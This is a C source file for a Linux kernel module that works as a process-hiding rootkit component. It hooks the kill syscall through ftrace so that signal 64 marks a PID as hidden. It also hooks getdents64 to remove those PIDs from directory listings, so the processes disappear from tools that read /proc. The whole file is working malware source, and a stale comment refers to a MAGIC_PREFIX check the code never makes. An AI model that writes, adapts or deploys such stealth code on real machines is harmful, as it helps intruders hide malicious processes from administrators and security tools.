/**
 * Hiding processes.
 * 
 * Notes : I chose to implement this on recent kernel version using pt_regs. => refer to syscall_hooking to view more about old usage
 * 
 * Notes : 
 * This module focus only on kernel version > 4.17.0 for the the test using new pt_regs structs.
 * 
 * @author Yekuuun
 */
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>
#include <linux/dirent.h>
#include <linux/string.h>

#include "../lib/hook/ftrace_helper.h"

#define MAX_PIDS          20
#define KILL_HANDLER_SIG  64
#define MODNAME           "HIDE_PROCESS"
#define MAGIC_PREFIX      "MAGIC"

MODULE_AUTHOR("Yekuuun");
MODULE_DESCRIPTION("Hiding processes.");
MODULE_LICENSE("GPL");
MODULE_VERSION("0.0.1");

static char hide_pids[MAX_PIDS][NAME_MAX] = {0};
static size_t pid_count = 0;

/**
 * Handling sys_kill hooks.
 */
static asmlinkage long (*orig_kill)(const struct pt_regs *regs);

static asmlinkage long hook_kill(const struct pt_regs *regs) {
    int pid = regs->di;
    int sig = regs->si;

    pr_info("[*] Handling hook targetting process : %d with flag : %d\n", pid, sig);

    if (sig == KILL_HANDLER_SIG) {
        if (pid_count >= MAX_PIDS) {
            pr_err("[!] Max number of hidden PIDs reached.\n");
            return 0;

            /**
             * To do later => empty array / add delete options.
             */
        }

        pr_info("[*] Adding %d to hidden pids.\n", pid);

        sprintf(hide_pids[pid_count], "%d", pid);
        pid_count++;

        return 0;
    }

    return orig_kill(regs);
}

/**
 * Handling get_dents64 hook.
 */
static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);

static asmlinkage long hook_getdents64(const struct pt_regs *regs){
    long err;
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    long size_ret = orig_getdents64(regs);

    if (size_ret <= 0)
        return size_ret;

    dirent_ker = kzalloc(size_ret, GFP_KERNEL);
    if (!dirent_ker)
        return size_ret;

    err = copy_from_user(dirent_ker, dirent, size_ret);
    if (err)
        goto CLEANUP;

    while (offset < size_ret) {
        current_dir = (void *)dirent_ker + offset;

        bool hidden = false;
        for (size_t i = 0; i < pid_count; i++) {
            if (memcmp(hide_pids[i], current_dir->d_name, strlen(hide_pids[i])) == 0) {
                hidden = true;
                break;
            }
        }

        /* Correction 6 : vérification MAGIC_PREFIX + PIDs cachés */
        if (hidden)
        {
            if (current_dir == dirent_ker)
            {
                size_ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, size_ret);
                continue;
            }

            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else {
            previous_dir = current_dir;
        }

        offset += current_dir->d_reclen;
    }

    err = copy_to_user(dirent, dirent_ker, size_ret);

CLEANUP:
    kfree(dirent_ker);
    return size_ret;
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_kill",       hook_kill,       &orig_kill),
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
};

static int __init hide_process_init(void)
{
#if !defined(CONFIG_X86_64) || (LINUX_VERSION_CODE < KERNEL_VERSION(4,17,0))
    pr_err("[!] Unsupported kernel version or architecture.\n");
    return -EINVAL;
#endif

    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) {
        pr_err("[%s] Failed to install hooks: %d\n", MODNAME, err);
        return err;
    }

    pr_info("[%s] Module loaded, hooks installed.\n", MODNAME);
    return 0;
}

static void __exit hide_process_exit(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    pr_info("[%s] Module unloaded, hooks removed.\n", MODNAME);
}

module_init(hide_process_init);
module_exit(hide_process_exit);